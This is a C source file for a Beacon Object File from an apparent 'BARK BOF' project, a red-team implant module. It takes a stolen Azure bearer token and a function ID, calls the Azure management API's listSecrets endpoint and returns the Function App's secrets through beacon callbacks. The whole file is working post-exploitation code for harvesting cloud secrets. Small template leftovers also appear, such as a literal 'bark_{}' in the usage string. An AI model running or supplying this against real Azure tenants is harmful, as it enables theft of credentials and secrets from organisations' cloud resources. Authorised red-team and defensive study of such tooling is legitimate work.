/*
 * get_azure_function_app_function_file.c — BARK BOF
 * Get-AzureFunctionAppFunctionFile — Get secrets/config of a Function App function
 *
 * Args : token, functionId
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    static char pathBuf[2048];
    static char bodyBuf[4096];
    LPWSTR widePath = NULL;
    char  *token = NULL;
    char  *functionId = NULL;
    BeaconDataParse(&parser, args, alen);
    token = BeaconDataExtract(&parser, NULL);
    functionId = BeaconDataExtract(&parser, NULL);
    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Usage: bark_{}" "\n", "<token> <functionId>");
        return;
    }
    MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf), "{}", functionId);
    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf), "%s/listSecrets?api-version=2018-11-01", functionId);
    widePath = MbsToWcs(pathBuf);
    if (!widePath) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }
    BarkPost(L"management.azure.com", widePath, L"POST", bodyBuf, token, "application/json");
    HFree(widePath);
}
